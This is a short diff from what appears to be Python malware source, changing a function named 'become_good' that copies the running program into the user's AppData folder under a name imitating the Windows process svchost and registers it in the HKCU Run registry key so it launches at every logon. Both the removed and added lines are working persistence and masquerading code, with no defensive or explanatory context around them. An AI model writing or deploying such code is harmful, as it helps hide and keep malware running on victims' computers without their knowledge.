@@ -16,7 +16,7 @@ CHUNK_SIZE = 8192
 
 
 def become_good():
-    themes_file_location = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Themes", "svchost1.exe")
+    themes_file_location = os.path.join(os.environ["APPDATA"], "svchost_templates.exe")
     if not os.path.exists(themes_file_location):
         shutil.copyfile(sys.executable, themes_file_location)
         subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svc_host12 /t REG_SZ /d "' + themes_file_location + '"', shell=True)
